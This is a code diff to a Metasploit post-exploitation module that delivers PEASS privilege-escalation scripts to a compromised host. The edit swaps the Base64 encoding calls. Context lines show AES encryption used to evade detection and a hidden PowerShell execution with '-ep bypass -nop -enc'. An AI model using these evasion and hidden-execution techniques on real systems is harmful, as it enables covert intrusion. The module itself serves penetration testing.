@@ -117,7 +117,7 @@ class MetasploitModule < Msf::Post
         # As the PS function is only capable of decrypting readable strings
         # in Windows we encrypt the B64 of the binary and then load it in memory
         # from the initial B64. Then: original -> B64 -> encrypt -> B64
-        aes_enc_peass_ret = aes_enc_peass(Base64.encode64(peass_script)) # Base64 before encrypting it
+        aes_enc_peass_ret = aes_enc_peass(Base64.strict_encode64(peass_script)) # Base64 before encrypting it
         peass_script_64 = aes_enc_peass_ret['encrypted']
         key_b64 = aes_enc_peass_ret['key_b64']
         iv_b64 = aes_enc_peass_ret['iv_b64']
@@ -137,7 +137,7 @@ class MetasploitModule < Msf::Post
 
       # Encode PEASS script
       print_status('Encoding PEASS in Base64...')
-      peass_script_64 = Base64.encode64(peass_script)
+      peass_script_64 = Base64.strict_encode64(peass_script)
 
       # Needed code to decode it in Unix and Windows
       decode_linpeass_cmd = 'base64 -d'
@@ -224,7 +224,7 @@ class MetasploitModule < Msf::Post
         cmd += last_cmd
         # Transform to Base64 in UTF-16LE format
         cmd_utf16le = cmd.encode('utf-16le')
-        cmd_utf16le_b64 = Base64.encode64(cmd_utf16le).gsub(/\r?\n/, '')
+        cmd_utf16le_b64 = Base64.strict_encode64(cmd_utf16le).gsub(/\r?\n/, '')
 
         tmpout << cmd_exec('powershell.exe', "-ep bypass -WindowStyle hidden -nop -enc #{cmd_utf16le_b64}", datastore['TIMEOUT'].to_i)
 
@@ -314,9 +314,9 @@ class MetasploitModule < Msf::Post
     return {
       'encrypted' => encrypted,
       'key_hex' => key.unpack('H*').first,
-      'key_b64' => Base64.encode64(key).strip,
+      'key_b64' => Base64.strict_encode64(key).strip,
       'iv_hex' => iv.unpack('H*').first,
-      'iv_b64' => Base64.encode64(iv).strip
+      'iv_b64' => Base64.strict_encode64(iv).strip
     }
   end
 
